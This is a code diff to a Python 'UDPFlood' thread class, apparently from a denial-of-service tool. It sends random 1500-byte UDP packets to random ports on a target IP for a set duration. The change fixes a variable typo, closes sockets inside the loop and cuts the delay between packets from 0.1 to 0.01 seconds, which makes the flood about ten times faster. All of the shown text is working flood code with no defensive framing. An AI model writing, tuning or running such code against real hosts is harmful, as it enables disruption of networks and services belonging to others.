@@ -18,16 +18,17 @@ class UDPFlood(threading.Thread):
         # print(threading.Thread.getName(self))
         self.sent_packets = 0
         port = random.randint(1024, 65535)
-        star_time = datetime.now()
-        end_time = star_time + timedelta(minutes=self.duration)
+        start_time = datetime.now()
+        end_time = start_time + timedelta(minutes=self.duration)
         # for testing reasons just 20 seconds
         #end_time = star_time + timedelta(seconds=20)
         while datetime.now() <= end_time:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect((self.ip, random.randint(1024, 65535)))
             s.send(os.urandom(1500))
-            time.sleep(0.1)
+            time.sleep(0.01)
             self.sent_packets = self.sent_packets + 1
+            s.close()
         # print(threading.Thread.getName(self) +
         #      " sent " + str(sent_packets) + " packets")
         s.close()
